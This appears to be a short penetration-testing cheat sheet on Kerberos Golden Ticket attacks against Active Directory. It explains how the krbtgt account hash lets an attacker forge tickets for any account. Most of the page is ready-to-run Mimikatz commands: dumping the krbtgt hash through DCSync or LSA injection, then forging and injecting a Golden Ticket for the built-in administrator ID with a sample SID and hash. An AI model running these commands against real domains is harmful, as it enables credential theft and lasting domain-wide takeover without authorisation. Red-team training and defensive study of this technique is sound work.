# Golden Tickets

## Brief

> **Understanding Silver / Golden Tickets : https://en.hackndo.com/kerberos-silver-golden-tickets/**

Golden Ticket attacks can be carried out against Active Directory domains, where access control is implemented using Kerberos tickets issued to authenticated users by a Key Distribution Service(KDC). The attacker gains control over the **domain’s KDC account** (KRBTGT account) by stealing its NTLM hash. This allows the attacker to generate Ticket Granting Tickets (TGTs) for any account in the Active Directory domain. With valid TGTs, the attacker can request access to any resource/system on its domain from the Ticket Granting Service (TGS).

**The NTLM hash of the krbtgt account can be obtained via :**

* DCSync (Mimikatz)
* LSA (Mimikatz)
* Hashdump (meterpreter)
* NTDS.DIT

## Attack

The **DCSync** is a mimikatz feature which will try to impersonate a domain controller and request account password information from the targeted domain controller. This technique is less noisy as it doesn’t require direct access to the domain controller or retrieving the NTDS.DIT file over the network.

```powershell
lsadump::dcsync /user:krbtgt
# Alternatively Mimikatz can retrieve the hash of the krbtgt account from the Local Security Authority (LSA) by executing Mimikatz on the domain controller.
privilege::debug
lsadump::lsa /inject /name:krbtgt
# Now once you get the previously needed information and still in mimikatz :
kerberos::golden /User:random_user /domain:domain.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /id:500 /ptt

# cmd popup!
```
